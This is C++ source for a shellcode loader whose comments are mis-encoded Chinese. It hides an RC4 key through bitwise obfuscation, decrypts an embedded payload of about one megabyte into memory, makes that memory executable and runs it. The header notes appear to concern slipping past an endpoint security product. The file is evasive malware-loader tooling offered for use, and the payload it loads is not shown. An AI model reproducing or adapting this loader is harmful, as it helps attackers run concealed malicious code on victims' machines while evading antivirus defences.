// ShellcodeLoader.cpp : �������̨Ӧ�ó������ڵ㡣
//
/*

����ʱ�䣺2021��1��2��21:15:45

���뻷����vs2010 Win32 release

�ַ����룺���ֽ��ַ���

��Ŀ���ã�
�رջ�������ȫ��飬����Ϊ��Ƕ����ʱ���򲻱�
��������ʱ���ѡĬ��ֵ
����ִ�б����رգ���ѡ��������رվͲ���Ҫ�޸��ڴ�ִ��Ȩ�ޣ����������Ӱ�죬��Ϊ���Ѿ���д��VirtualProtect
�嵥����-�������-Ƕ���嵥�������Ҫ�رգ������������ر�����Ϣ���� SecureAge APEX



*/

#include "stdafx.h"


//-------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------

int StartShellcode();
void InitKey();

//-------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------



char key[64] = {0};



int main()
{
	StartShellcode();

	return 0;
}

// ��ʼ����Կ
void InitKey()
{
	key[0] = ~'H' + 3;
	key[1] = ~'a' + 3;
	key[2] = ~'m' + 3;
	key[3] = ~'b' + 3;
	key[4] = ~'a' + 3;
	key[5] = ~'g' + 3;
	key[6] = ~'a' + 3;

	for (size_t i = 0; i < 7; i++)
	{
		key[i] -= 3;
		key[i] = ~key[i];			
	}
}

// ���ܣ�����shellcode
int StartShellcode()
{
	InitKey();

	// ��ʼ��NTDLL����
	InitWow64Transition();

	//shellcode �������Ĵ�С�� ShellcodeData.cpp �в鿴
	DWORD dwShellcodeSize = 1067626;

	LPVOID pShellcode = MyVirtualAlloc(NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// д��shellcode
	InitShellcode(pShellcode);

	// ����
	Rc4Decrypt(pShellcode, dwShellcodeSize, key, strlen(key));

	// �޸��ڴ�����Ϊ��ִ��
	DWORD OldProtect;
	MyVirtualProtect(pShellcode, dwShellcodeSize, PAGE_EXECUTE_READWRITE, &OldProtect);

	// ִ��
	((LPTHREAD_START_ROUTINE)pShellcode)(0);

	return 0;
}



